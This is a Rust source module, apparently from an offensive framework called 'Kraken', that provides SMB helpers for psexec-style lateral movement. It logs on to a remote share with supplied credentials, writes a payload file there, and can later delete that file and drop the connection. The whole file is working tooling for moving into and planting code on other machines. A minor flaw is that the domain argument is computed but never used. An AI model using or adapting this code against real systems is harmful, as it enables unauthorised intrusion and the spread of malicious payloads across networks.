//! SMB file operations helper
//!
//! Provides helpers for connecting to SMB shares and copying files
//! used by psexec and other lateral movement techniques.

use common::KrakenError;

/// SMB share connection and file copy result
#[derive(Debug)]
pub struct SmbCopyResult {
    pub remote_path: String,
    pub bytes_written: u64,
}

/// Copy a local buffer to a remote UNC path via SMB.
///
/// Uses WNetAddConnection2W to authenticate to the share, then
/// WriteFile to place the payload.
#[cfg(windows)]
pub fn copy_to_share(
    target: &str,
    share: &str,
    filename: &str,
    data: &[u8],
    username: Option<&str>,
    password: Option<&str>,
    domain: Option<&str>,
) -> Result<SmbCopyResult, KrakenError> {
    use std::ffi::OsStr;
    use std::iter::once;
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::NetworkManagement::WNet::{
        WNetAddConnection2W, WNetCancelConnection2W, NETRESOURCEW, RESOURCETYPE_DISK,
    };
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
        GENERIC_WRITE,
    };

    fn wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(once(0)).collect()
    }

    // \\target\share
    let share_path = format!("\\\\{}\\{}", target, share);
    let share_wide = wide(&share_path);

    // Optionally authenticate
    let (user_ptr, pass_ptr): (*const u16, *const u16) = match (username, password) {
        (Some(u), Some(p)) => {
            let uw = Box::leak(wide(u).into_boxed_slice()).as_ptr();
            let pw = Box::leak(wide(p).into_boxed_slice()).as_ptr();
            (uw, pw)
        }
        _ => (std::ptr::null(), std::ptr::null()),
    };

    let domain_wide: Option<Vec<u16>> = domain.map(|d| wide(d));
    let _domain_ptr: *const u16 = domain_wide
        .as_ref()
        .map(|v| v.as_ptr())
        .unwrap_or(std::ptr::null());

    let mut nr = NETRESOURCEW {
        dwType: RESOURCETYPE_DISK,
        lpLocalName: std::ptr::null_mut(),
        lpRemoteName: share_wide.as_ptr() as *mut u16,
        lpProvider: std::ptr::null_mut(),
        dwScope: 0,
        dwDisplayType: 0,
        dwUsage: 0,
        lpComment: std::ptr::null_mut(),
    };

    let rc = unsafe { WNetAddConnection2W(&mut nr, pass_ptr, user_ptr, 0) };
    if rc != 0 {
        return Err(KrakenError::Module(format!(
            "WNetAddConnection2W failed: {}",
            rc
        )));
    }

    // Write payload to \\target\share\filename
    let remote_file = format!("\\\\{}\\{}\\{}", target, share, filename);
    let remote_wide = wide(&remote_file);

    let hfile = unsafe {
        CreateFileW(
            remote_wide.as_ptr(),
            GENERIC_WRITE,
            FILE_SHARE_READ,
            std::ptr::null(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            0,
        )
    };

    if hfile == INVALID_HANDLE_VALUE {
        let err = unsafe { windows_sys::Win32::Foundation::GetLastError() };
        unsafe {
            WNetCancelConnection2W(share_wide.as_ptr(), 0, 1);
        }
        return Err(KrakenError::Module(format!(
            "CreateFileW failed: {}",
            err
        )));
    }

    let mut written: u32 = 0;
    let ok = unsafe {
        WriteFile(
            hfile,
            data.as_ptr(),
            data.len() as u32,
            &mut written,
            std::ptr::null_mut(),
        )
    };

    unsafe { CloseHandle(hfile) };

    if ok == 0 {
        let err = unsafe { windows_sys::Win32::Foundation::GetLastError() };
        unsafe {
            WNetCancelConnection2W(share_wide.as_ptr(), 0, 1);
        }
        return Err(KrakenError::Module(format!("WriteFile failed: {}", err)));
    }

    // Leave connection open for caller to use; disconnect when done
    Ok(SmbCopyResult {
        remote_path: remote_file,
        bytes_written: written as u64,
    })
}

/// Disconnect a previously established SMB share connection.
#[cfg(windows)]
pub fn disconnect_share(target: &str, share: &str) {
    use std::ffi::OsStr;
    use std::iter::once;
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::NetworkManagement::WNet::WNetCancelConnection2W;

    let share_path = format!("\\\\{}\\{}", target, share);
    let share_wide: Vec<u16> = OsStr::new(&share_path)
        .encode_wide()
        .chain(once(0))
        .collect();
    unsafe {
        WNetCancelConnection2W(share_wide.as_ptr(), 0, 1);
    }
}

/// Delete a file on a remote share.
#[cfg(windows)]
pub fn delete_remote_file(target: &str, share: &str, filename: &str) -> bool {
    use std::ffi::OsStr;
    use std::iter::once;
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::Storage::FileSystem::DeleteFileW;

    let path = format!("\\\\{}\\{}\\{}", target, share, filename);
    let wide: Vec<u16> = OsStr::new(&path).encode_wide().chain(once(0)).collect();
    unsafe { DeleteFileW(wide.as_ptr()) != 0 }
}

#[cfg(not(windows))]
pub fn copy_to_share(
    _target: &str,
    _share: &str,
    _filename: &str,
    _data: &[u8],
    _username: Option<&str>,
    _password: Option<&str>,
    _domain: Option<&str>,
) -> Result<SmbCopyResult, KrakenError> {
    Err(KrakenError::Module(
        "SMB operations only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn disconnect_share(_target: &str, _share: &str) {}

#[cfg(not(windows))]
pub fn delete_remote_file(_target: &str, _share: &str, _filename: &str) -> bool {
    false
}
